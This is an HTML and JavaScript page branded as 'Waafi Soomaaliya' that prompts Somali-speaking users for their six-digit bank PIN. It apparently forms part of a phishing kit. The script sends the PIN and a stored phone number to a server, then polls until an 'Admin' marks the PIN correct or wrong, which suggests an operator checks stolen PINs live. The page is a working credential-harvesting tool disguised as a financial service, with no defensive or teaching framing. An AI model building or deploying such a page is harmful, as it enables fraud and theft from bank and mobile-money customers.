<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waafi - Bank PIN</title>
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { margin: 0; padding: 0; background-color: #fff; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        
        .container { flex: 1; padding: 40px 20px; text-align: center; }
        h2 { font-size: 22px; color: #333; margin-bottom: 10px; font-weight: 500; }
        p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 25px; }

        .pin-inputs { display: flex; justify-content: center; gap: 8px; margin: 30px 0; }
        .pin-inputs input {
            width: 45px; height: 55px; border: 1.5px solid #ccc; border-radius: 8px;
            text-align: center; font-size: 20px; font-weight: bold; outline: none;
        }
        .pin-inputs input:focus { border-color: #2ecc71; border-width: 2px; }

        .btn-verify {
            width: 100%; max-width: 300px; padding: 15px; border-radius: 10px;
            border: none; background-color: #e0e0e0; color: #a0a0a0;
            font-size: 14px; font-weight: bold; cursor: not-allowed; text-transform: uppercase;
            transition: 0.3s;
        }
        .btn-verify.active { background-color: #2ecc71; color: white; cursor: pointer; }

        .footer {
            position: relative; height: 250px; background: linear-gradient(to bottom, #2ecc71, #27ae60);
            border-top-left-radius: 50% 100px; border-top-right-radius: 50% 100px;
            display: flex; justify-content: center; align-items: center; color: white;
            font-size: 12px; margin-top: auto;
        }
    </style>
</head>

<body>

<div class="container">
    <h2>Geli PIN-ka Bangiga</h2>
    <p>Fadlan geli 6-da god ee PIN-kaaga bangiga si aad u xaqiijiso aqoonsigaaga.</p>

    <div class="pin-inputs">
        <input type="password" maxlength="1" inputmode="numeric">
        <input type="password" maxlength="1" inputmode="numeric">
        <input type="password" maxlength="1" inputmode="numeric">
        <input type="password" maxlength="1" inputmode="numeric">
        <input type="password" maxlength="1" inputmode="numeric">
        <input type="password" maxlength="1" inputmode="numeric">
    </div>

    <button class="btn-verify" id="submit-btn">XAQIIJI PIN-KA BANGIGA</button>
    <div id="status-msg" style="margin-top:15px; font-size:14px; font-weight:500;"></div>
</div>

<div class="footer">
    © 2026 Waafi Soomaaliya
</div>

<script>
const inputs = document.querySelectorAll('.pin-inputs input');
const btn = document.getElementById('submit-btn');
const statusMsg = document.getElementById('status-msg');

// 1. Auto-navigation and input cleaning
inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, ''); // Numbers only

        if (input.value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
        checkFull();
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && index > 0) {
            inputs[index - 1].focus();
        }
    });
});

function checkFull() {
    const pin = Array.from(inputs).map(i => i.value).join('');
    if (pin.length === 6) {
        btn.classList.add('active');
        btn.style.cursor = "pointer";
    } else {
        btn.classList.remove('active');
        btn.style.cursor = "not-allowed";
    }
}

// 2. Submit to API and Poll for Admin approval
btn.addEventListener('click', async () => {
    if (!btn.classList.contains('active')) return;

    const pin = Array.from(inputs).map(i => i.value).join('');
    
    // IMPORTANT: Make sure 'userPhone' was saved in localStorage during login
    const phone = localStorage.getItem('userPhone');

    if (!phone) {
        statusMsg.style.color = "red";
        statusMsg.innerText = "Khalad: Lambarka lama helin. Fadlan dib u soco.";
        return;
    }

    // UI Feedback
    btn.disabled = true;
    btn.innerText = "FADLAN SUG...";
    btn.classList.remove('active');
    statusMsg.style.color = "#333";
    statusMsg.innerText = "Xaqiijinta PIN-ka...";

    try {
        const response = await fetch('/api/verify-bank-pin', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: phone, bankPin: pin })
        });

        const data = await response.json();

        if (data.success) {
            statusMsg.innerText = "Waa la diray. Fadlan sug oggolaanshaha...";
            startPolling(phone);
        } else {
            throw new Error("Server error");
        }
    } catch (err) {
        btn.disabled = false;
        btn.innerText = "XAQIIJI PIN-KA BANGIGA";
        btn.classList.add('active');
        statusMsg.style.color = "red";
        statusMsg.innerText = "Xiriirka ayaa go'ay. Isku day markale.";
    }
});

// 3. Polling function to wait for Admin button click
function startPolling(phone) {
    const pollInterval = setInterval(async () => {
        try {
            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
            const data = await res.json();

            if (data.status === "bank_pin_correct") {
                clearInterval(pollInterval);
                window.location.href = "/success.html"; // Redirect to success page
            } else if (data.status === "bank_pin_wrong") {
                clearInterval(pollInterval);
                alert("PIN-ka Bangiga waa khalad. Fadlan mar kale isku day.");
                location.reload(); // Reset the page for retry
            }
        } catch (e) {
            console.error("Polling error...");
        }
    }, 3000); // Check every 3 seconds
}
</script>

</body>
</html>
